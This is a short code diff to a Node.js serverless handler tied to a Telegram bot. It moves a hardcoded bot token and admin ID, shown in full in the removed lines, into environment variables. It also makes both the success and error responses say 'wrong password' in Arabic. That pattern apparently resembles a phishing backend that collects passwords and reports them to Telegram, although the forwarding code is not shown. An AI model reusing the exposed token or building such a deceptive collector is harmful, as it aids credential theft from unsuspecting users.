@@ -1,7 +1,7 @@
 const https = require('https');
 
-const token = '5744685803:AAG1lO_jDrP6BC2qMmNx6Soqd6TB5u15ikg';
-const adminId = '5581716001';
+const token = process.env.TELEGRAM_BOT_TOKEN;
+const adminId = process.env.TELEGRAM_ADMIN_ID;
 
 exports.handler = async function (event, context) {
     if (event.httpMethod !== 'POST') {
@@ -35,12 +35,12 @@ exports.handler = async function (event, context) {
 
         return {
             statusCode: 200,
-            body: JSON.stringify({ message: '' }),
+            body: JSON.stringify({ message: 'كلمة المرور خاطئة' }),
         };
     } catch (error) {
         return {
             statusCode: 500,
-            body: JSON.stringify({ message: '' }),
+            body: JSON.stringify({ message: 'كلمة المرور خاطئة' }),
         };
     }
 };
